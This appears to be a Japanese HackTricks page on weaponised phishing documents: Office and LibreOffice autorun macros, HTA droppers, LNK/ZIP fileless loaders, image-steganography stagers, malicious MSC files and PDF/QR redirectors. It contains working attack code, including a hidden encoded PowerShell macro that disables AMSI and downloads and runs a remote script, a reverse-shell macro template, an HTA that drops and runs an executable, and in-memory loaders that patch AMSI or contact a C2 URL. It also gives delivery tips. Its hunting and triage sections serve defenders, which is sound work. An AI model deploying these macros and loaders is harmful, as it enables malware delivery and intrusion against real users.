# フィッシングファイルとドキュメント

{{#include ../../banners/hacktricks-training.md}}

## Officeドキュメント

Microsoft Wordはファイルを開く前に、ファイルデータの検証を行います。検証では、OfficeOpenXML標準に基づいてデータ構造を識別します。データ構造の識別中にエラーが発生すると、解析対象のファイルは開かれません。

通常、マクロを含むWordファイルには`.docm`拡張子が使われます。ただし、ファイル拡張子を変更して名前を変更しても、マクロの実行機能を維持することができます。\
たとえば、RTFファイルは仕様上マクロをサポートしていませんが、DOCMファイルの拡張子をRTFに変更すると、Microsoft Wordで処理され、マクロを実行できるようになります。\
同じ内部構造と仕組みは、Microsoft Office Suiteのすべてのソフトウェア（Excel、PowerPointなど）に適用されます。

次のコマンドを使用して、一部のOfficeプログラムで実行対象となる拡張子を確認できます。

```bash
assoc | findstr /i "word excel powerp"
```

DOCXファイルは、マクロを含むリモートテンプレート（File –Options –Add-ins –Manage: Templates –Go）を参照することで、マクロを「実行」することもできます。

### 外部画像の読み込み

次の場所に移動します: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - 外部画像の読み込み: 次の場所に移動します: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### マクロのバックドア

マクロを使用して、ドキュメントから任意のコードを実行できます。

#### 自動読み込み関数

これらは一般的であるほど、AVに検出される可能性が高くなります。

- AutoOpen()
- Document_Open()

#### マクロコードの例ಗಳು

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### メタデータを手動で削除する

**File > Info > Inspect Document > Inspect Document** に進むと、Document Inspector が表示されます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc の拡張子

完了したら、**Save as type** ドロップダウンを選択し、形式を **`.docx`** から Word 97-2003 **`.doc`** に変更します。\
これは、**`.docx` にはマクロを保存できず**、マクロ有効形式の **`.docm`** 拡張子には**抵抗感**があるためです（例：サムネイルアイコンに大きな `!` が表示され、一部の Web/メールゲートウェイでは完全にブロックされます）。そのため、この**レガシーな `.doc` 拡張子が最善の妥協案**です。

#### 悪意のあるマクロの生成ツール

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT の自動実行マクロ（Basic）

LibreOffice Writer のドキュメントには Basic マクロを埋め込み、マクロを **Open Document** イベントに割り当てることで、ファイルを開いたときに自動実行できます（Tools → Customize → Events → Open Document → Macro…）。<sup>[[1]](#references)</sup> シンプルな reverse shell マクロは次のようになります。

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

文字列内の二重引用符（`""`）に注意してください。LibreOffice Basic では、リテラルの引用符をエスケープするために使われます。そのため、`...==""")` で終わる payload では、内側のコマンドと Shell の引数の両方で引用符の対応が取れます。

配信のヒント:

- `.odt` として保存し、マクロをドキュメントのイベントに割り当てて、開いたときにすぐ実行されるようにします。
- `swaks` でメールを送信する際は、`--attach @resume.odt` を使います（ファイル名の文字列ではなくファイルの内容を添付するため、`@` が必要です）。これは、検証なしで任意の `RCPT TO` の宛先を受け入れる SMTP サーバーを悪用する際に重要です。

## HTA ファイル

HTA は、**HTML とスクリプト言語（VBScript や JScript など）を組み合わせた** Windows プログラムです。ユーザーインターフェースを生成し、ブラウザーのセキュリティモデルによる制約を受けずに、「完全に信頼された」アプリケーションとして実行されます。

HTA は **`mshta.exe`** を使って実行されます。通常、**Internet Explorer** と一緒にインストールされるため、**`mshta` は IE に依存します**。そのため、IE がアンインストールされていると、HTA は実行できません。

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## NTLM Authentication の強制

**リモートで** NTLM Authentication を**強制する**方法はいくつかあります。たとえば、メールやユーザーがアクセスする HTML に**不可視画像**を追加できます（HTTP MitM でも可能？）。また、**フォルダーを開くだけで** Authentication が**トリガー**される**ファイルのパス**を被害者に送る方法もあります。

**以下のページで、これらのアイデアなどを確認してください：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュや Authentication を盗むだけでなく、**NTLM relay attacks を実行することもできる**点を忘れないでください。

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

非常に効果的なキャンペーンでは、正規の囮文書（PDF/DOCX）2つと悪意のある .lnk を含む ZIP を配布します。仕掛けは、実際の PowerShell loader が ZIP の生バイト列内の一意な marker の後に格納されており、.lnk がそれを切り出して、完全にメモリ上で実行することです。<sup>[[2]](#references)</sup>

.lnk の PowerShell one-liner で実装される一般的なフロー：

1) Desktop、Downloads、Documents、%TEMP%、%ProgramData%、および現在の作業ディレクトリの親ディレクトリなど、一般的なパスから元の ZIP を探す。
2) ZIP のバイト列を読み込み、ハードコードされた marker（例：xFIQCV）を探す。marker 以降のすべてが埋め込み PowerShell payload となる。
3) ZIP を %ProgramData% にコピーして展開し、正規のファイルに見せかけるために囮の .docx を開く。
4) 現在のプロセスで AMSI をバイパスする：[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 次の stage の難読化を解除する（例：すべての # 文字を削除する）とともに、メモリ上で実行する。

埋め込み stage を切り出して実行する PowerShell の骨組みの例：

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

メモ
- 配信では、信頼性の高い PaaS サブドメイン（例: *.herokuapp.com）が悪用されることが多く、ペイロードの配信が制限される場合もあります（IP/UA に基づいて無害な ZIP を配信するなど）。
- 次のステージでは、base64/XOR で暗号化された shellcode を復号し、Reflection.Emit + VirtualAlloc 経由で実行して、ディスク上の痕跡を最小限に抑えることがよくあります。

同じチェーンで使われるPersistence
- Microsoft Web Browser コントロールの COM TypeLib hijacking により、IE/Explorer やこれを埋め込んだアプリがペイロードを自動的に再起動するようにします。<sup>[[2]](#references)[[4]](#references)</sup> 詳細とすぐに使えるコマンドはこちら:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

ハンティング/IOCs
- アーカイブデータの末尾に ASCII マーカー文字列（例: xFIQCV）が追加された ZIP ファイル。
- 親フォルダーやユーザーフォルダーを列挙して ZIP を探し、おとり文書を開く .lnk。
- [System.Management.Automation.AmsiUtils]::amsiInitFailed による AMSI の改ざん。
- 信頼された PaaS ドメインでホストされたリンクで終わる、長く続いている業務メールのスレッド。

## おとりを先に表示する LNK ステージング → scheduled-task persistence → 信頼された CPL の side-loading

繰り返し確認されているパターンの1つは、無害なおとりをすぐに開く一方で、バックグラウンドで実際のチェーンを準備する、**文書になりすました `.lnk`** です。<sup>[[3]](#references)</sup>

確認されたワークフロー:
1. ショートカットは**PDFを装い**、`conhost.exe` または同様のプロキシを使って、難読化された PowerShell downloader を起動します。
2. PowerShell は明白なトークン（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`）を分割し、`iwr`、`gci`、`ren`、`cpi`、`schtasks` を探す単純な検知を回避します。
3. stager はまず**おとり文書をダウンロード**して被害者に開かせ、その後、バックグラウンドで悪意のあるファイルを再構成します。
4. ペイロードは**ダミーの拡張子**で書き込まれ、後から埋め草文字を削除してリネームされることがあります。これにより、明らかな `.exe` / `.cpl` の痕跡が現れるのを遅らせます。
5. ユーザーが書き込み可能なパスから信頼されたホストバイナリを起動する、**分単位の scheduled task** によってPersistenceを確立します。

このパターンから得られる最小限のハンティングの手掛かり:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

認識しておくと役立つステージング構成:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` または `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 第2段階がステルス性に優れている理由

Rapid7の事例では、スケジュールされたタスクが **`Fondue.exe`** を `C:\Users\Public\` から繰り返し起動していました。**`APPWIZ.cpl`** がその隣に配置され、**`RunFODW`** をエクスポートしていたため、信頼されたMicrosoftバイナリは正規のシステムコピーではなく、攻撃者のCPLをサイドロードしました。

CPLは次の処理を行いました:
- `C:\Windows\Tasks\editor.dat` から **AES-256-CBC** のblobを読み込む
- **Windows CNG / `bcrypt.dll`** を介して復号する
- 実行可能メモリを確保し、復号したshellcodeをコピーする
- shellcodeのポインターを **`EnumUILanguagesW`** のコールバックとして渡し、間接的に実行する

最後の手順は個別にハントする価値があります。マルウェアは、`((void(*)())buf)()` のような直接ジャンプを避け、代わりに**正規のコールバックを受け取るWinAPI**を悪用して実行を移すことがよくあります。

このキャンペーンの復号後のpayloadは **Donut** shellcodeで、最終PEをすべてメモリ内にマッピングし、実行を引き渡す前に現在のプロセス内で **AMSI/WLDP/ETW** にパッチを適用しました。サイドローディングとメモリ常駐型の後処理について詳しくは、以下を参照してください:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

実践的なハントの手掛かり:
- `.lnk` が `powershell.exe` または `conhost.exe` を起動し、その後、目に見えるデコイ文書を表示する。
- `C:\Users\Public\` への短時間のダウンロード後、意味のない拡張子から直ちに名前が変更される。
- `GoogleErrorReport` のようなありふれた名前のスケジュールされたタスクが、**ユーザーが書き込み可能なディレクトリ**から実行される。
- 信頼されたバイナリが、システムディレクトリ以外の同じディレクトリから **`.cpl` / `.dll`** ファイルを読み込む。
- **`C:\Windows\Tasks\`** にBase64テキストblobが書き込まれ、後でサイドロードされたモジュールによって読み込まれる。

## 画像内のステガノグラフィ区切りpayload（PowerShell stager）

最近のloaderチェーンでは、難読化されたJavaScript/VBSが配布され、それがBase64のPowerShell stagerをデコードして実行します。このstagerは画像（多くの場合GIF）をダウンロードします。画像には、固有の開始／終了マーカーの間に、プレーンテキストとして隠されたBase64エンコード済みの.NET DLLが含まれています。スクリプトはこれらの区切り文字（実環境で確認された例: «<<sudo_png>> … <<sudo_odt>>>»）を検索し、その間のテキストを抽出してBase64デコードし、アセンブリをメモリ内に読み込んだうえで、C2 URLを指定して既知のエントリメソッドを呼び出します。<sup>[[5]](#references)</sup>

ワークフロー
- Stage 1: アーカイブされたJS/VBS dropper → 埋め込まれたBase64をデコード → `-nop -w hidden -ep bypass` を指定してPowerShell stagerを起動。
- Stage 2: PowerShell stager → 画像をダウンロードし、マーカーで区切られたBase64を切り出して、.NET DLLをメモリ内に読み込み、そのメソッド（例: VAI）にC2 URLとオプションを渡して呼び出す。
- Stage 3: Loaderが最終payloadを取得し、通常は信頼されたバイナリ（一般的にはMSBuild.exe）にprocess hollowingで注入する。<sup>[[7]](#references)[[8]](#references)</sup> process hollowingと信頼されたユーティリティを介したproxy executionについて詳しくは、こちらを参照してください:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

画像からDLLを切り出し、.NETメソッドをメモリ内で呼び出すPowerShellの例:

<details>
<summary>PowerShellによるstego payloadの抽出とロード</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notes
- これは ATT&CK T1027.003（steganography/marker-hiding）です。<sup>[[6]](#references)</sup> マーカーはキャンペーンごとに異なります。
- AMSI/ETW bypass と文字列の難読化解除は、アセンブリの読み込み前に一般的に適用されます。
- ハンティング: ダウンロードした画像を既知の区切り文字でスキャンし、PowerShell が画像にアクセスして直後に Base64 blob をデコードしていないか特定します。

stego tools と carving techniques も参照してください:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

繰り返し見られる初期ステージは、アーカイブ内で配布される、小さく高度に難読化された `.js` または `.vbs` です。その唯一の目的は、埋め込まれた Base64 文字列をデコードし、`-nop -w hidden -ep bypass` を指定して PowerShell を起動し、HTTPS 経由で次のステージをブートストラップすることです。<sup>[[5]](#references)</sup>

骨格となるロジック（概要）:
- 自身のファイル内容を読み取る
- ジャンク文字列の間にある Base64 blob を見つける
- ASCII の PowerShell にデコードする
- `wscript.exe`/`cscript.exe` から `powershell.exe` を呼び出して実行する

ハンティングの手掛かり
- コマンドラインに `-enc`/`FromBase64String` を含む `powershell.exe` を起動する、アーカイブ内の JS/VBS 添付ファイル。
- ユーザーの一時パスから `powershell.exe -nop -w hidden` を起動する `wscript.exe`。

## 実行コンテナとしての MSC ドキュメント (GrimResource)

Microsoft Management Console ファイル (`.msc`) は、通常 `mmc.exe` で開く XML コンソール定義です。**GrimResource** は、古い XSS primitive を含む `apds.dll` リソースへの `StringTable` 参照を悪用します。そのため、細工されたコンソールをユーザーが開くと、JavaScript が `mmc.exe` 内で実行されます。確認されたサンプルでは、`transformNode` を使った難読化と **DotNetToJScript** を組み合わせ、通常の Office マクロ経由の手法を使わずに .NET payload をインスタンス化していました。<sup>[[9]](#references)</sup>

静的トリアージでは、信頼できない MSC をテキストとして扱い、**ダブルクリックしないでください**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

高いシグナルとなる実行時の挙動は、`mmc.exe` が CLR またはスクリプトコンポーネントを読み込む、ネットワーク接続を作成する、あるいは `powershell.exe`、`cmd.exe`、`wscript.exe`、`cscript.exe`、`mshta.exe`、`rundll32.exe`、または想定外の実行ファイルを起動することです。この形式自体は正規のものなので、検知ではすべての MSC をブロックするのではなく、**発信元 + 不審な XML/スクリプトの内容 + `mmc.exe` の挙動**を相関させるべきです。<sup>[[9]](#references)</sup>

## PDF/QRリダイレクタとpayloadの出し分け

PDFは、悪用に脆弱性を必要としません。最近のキャンペーンでは、一見無害なドキュメントに**QRコードまたは一般的なリンク**を配置し、ブラウザーのセッションをメールのセキュリティ制御の外に誘導して、宛先を受信者のメールアドレスに合わせて個別化しています。Microsoftは、QRコードのURLが受信者ごとに異なり、RaccoonO365の認証情報窃取インフラにつながる2025年のPDFを報告しました。また、並行して使われた攻撃チェーンでは、IP/環境による判定によって、選別された訪問者にはJavaScript/MSIへのパスを返し、スキャナーや許可されていないクライアントには無害なPDFを返していました。<sup>[[10]](#references)</sup>

PDFのアクションと、レンダリングされたQRコードの両方をトリアージしてください。QRコードは抽出可能な画像として保存されず、ベクター描画されている場合があります。そのため、埋め込み画像の抽出に加え、すべてのページをラスタライズしてください：

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

分離された解析システムから、認証せずにデコード後の遷移先とリダイレクトを調査します。調査に役立つ特徴には、本文がほぼ空でQRコードのみのPDF、クエリパラメーターに埋め込まれた受信者のメールアドレス、信頼性の高いホスティングサービスを経由する複数回のリダイレクト、IP、地理的位置情報、Cookie、リファラー、ユーザーエージェントに応じて異なるコンテンツが返されることなどがあります。単一のサンドボックスによる取得では、おとりしか受け取れない場合があるため、制御したプロファイルを使ってリクエストを比較してください。<sup>[[10]](#references)</sup>

## NTLMハッシュを盗むためのWindowsファイル

**NTLM認証情報を盗める場所**のページを確認してください。

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLineキャンペーン：米国企業を標的とする高度なフィッシング攻撃](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode：中国をテーマにしたローダーチェーンを通じてDropping Elephantの手口を追跡](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [TypeLibのハイジャック – 新しいCOM永続化手法 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loaderがさまざまな情報窃取マルウェアを配信](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – ステガノグラフィ (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – プロセス・ハロウイング (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – 信頼された開発者ユーティリティのプロキシ実行：MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource：初期アクセスと回避のためのMicrosoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – 脅威アクターが納税シーズンを利用して税務をテーマにしたフィッシングキャンペーンを展開](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
